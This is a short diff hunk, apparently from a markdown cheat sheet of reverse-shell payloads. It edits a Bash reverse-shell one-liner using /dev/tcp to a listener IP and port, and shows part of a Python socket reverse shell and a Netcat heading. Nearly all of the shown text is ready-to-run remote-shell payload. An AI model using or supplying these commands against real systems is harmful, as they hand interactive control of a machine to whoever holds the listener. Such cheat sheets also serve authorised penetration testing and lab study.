@@ -25,7 +25,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #### Bash :
 
 ```
-bash -i &gt;&amp; /dev/tcp/192.168.0.5/4444 0&gt;&amp;1
+bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
 ```
 
 #### Netcat :
